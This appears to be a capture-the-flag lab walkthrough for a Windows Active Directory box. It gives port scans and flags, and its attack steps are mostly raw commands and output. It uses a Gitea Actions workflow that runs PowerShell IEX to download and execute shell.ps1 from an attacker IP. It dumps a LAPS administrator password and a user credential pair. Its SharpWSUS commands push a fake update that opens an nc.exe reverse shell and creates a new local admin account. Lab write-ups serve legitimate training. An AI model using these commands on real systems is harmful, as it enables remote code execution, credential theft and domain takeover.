Scan 1 :
```sh
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-12 13:16:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services

```
Scan 2 : 
```sh
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3000/tcp open  ppp?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

-  First foothold : 
```
- Create an account 
- Create a folder and enable action in the repo settings
```

- Upload the folder : `.gitea/workflows/demo.yaml`
```yaml
name: Execute wget (or curl) on commit or push
on: [push]

jobs:
  Execute-Wget:
    runs-on: windows-latest
    steps:
      - name: Execute curl command
        run: |
          powershell IEX (New-Object Net.WebClient).DownloadString('http://10.8.3.12:8080/shell.ps1')
        shell: cmd
```

- Push random item to get a shell 

- First user :
```sh
thomas.wallace
jiri.formacek
```

Flag :  VL{4e1989d1fe9a7cfc26c56efd7e7df933}

- Laps v2 : 
```powershell
Get-LAPSADPassword  -Identity srv
Get-LapsADPassword -Identity srv -DomainController dc -AsPlainText
```

```sh
ComputerName        : SRV
DistinguishedName   : CN=SRV,OU=Servers,DC=tea,DC=vl
Account             : Administrator
Password            : NC4X9563Yl+;$M
PasswordUpdateTime  : 9/18/2024 12:25:00 AM
ExpirationTimestamp : 10/18/2024 12:25:00 AM
Source              : EncryptedPassword
DecryptionStatus    : Success
AuthorizedDecryptor : TEA\Server Administration
```

Flag  VL{0625916903cc1c866ad33c963a400a61}

- Creds :
```sh
thomas.wallace:6e-34tD8B2QJ
```

- WSUS Update : 
https://github.com/techspence/SharpWSUS
```sh
SharpWSUS.exe locate
SharpWSUS.exe inspect 
SharpWSUS.exe create /payload:"C:\tools\PsExec64.exe" /args:" -accepteula -s -d C:\_install\nc.exe -e cmd.exe 10.8.3.12 4242" /title:"CVE-2022-30190"
SharpWSUS.exe approve /updateid:7d18aee2-2c8e-4857-b61e-1408a653dcbe /computername:dc.tea.vl /groupname:"Group Name"
#or 
SharpWSUS.exe create /payload:"C:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe  /c \" net user pavic Password_123 /add \""

SharpWSUS.exe create /payload:"C:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe  /c \"net localgroup administrators pavic /add \""

```
https://0xdf.gitlab.io/2022/12/10/htb-outdated.html

Root : VL{9bb75d5911b1a1f9bfe115facf5a6039}